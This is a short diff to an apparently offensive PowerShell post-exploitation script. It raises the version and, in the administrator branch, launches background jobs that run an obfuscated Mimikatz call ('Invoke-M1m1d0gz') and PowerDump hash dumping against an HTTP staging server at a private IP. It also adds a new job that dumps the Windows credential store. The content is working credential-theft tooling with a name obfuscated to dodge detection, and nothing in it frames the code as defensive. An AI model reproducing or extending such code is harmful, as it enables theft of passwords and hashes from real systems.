@@ -12,8 +12,8 @@
 
 
 
-$_Version = "2.3.1"
-$_BUILD = "1012"
+$_Version = "2.3.3"
+$_BUILD = "1013"
 
 # Encoded File Info
 $HTTP_Server="172.16.64.1"
@@ -123,7 +123,9 @@ if ($isAdmin) {
     Write-Host "`t Get-M1m1d0gz" 
     Start-Job -ScriptBlock $runBlockEnc -InitializationScript $runFunc -ArgumentList ("Invoke-M1m1d0gz",$Password, $HTTP_SERVER) | out-null
     Write-Host "`t Get-PowerDump" 
-    Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Invoke-PowerDump", $HTTP_SERVER) | out-null
+    Start-Job -ScriptBlock $runBlockEnc -InitializationScript $runFunc -ArgumentList ("Invoke-PowerDump", $HTTP_SERVER) | out-null
+    Write-Host "`t dumpCredStore";
+    Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("dumpCredStore", $HTTP_Server) | out-null
 }
 
 # Wait for all jobs
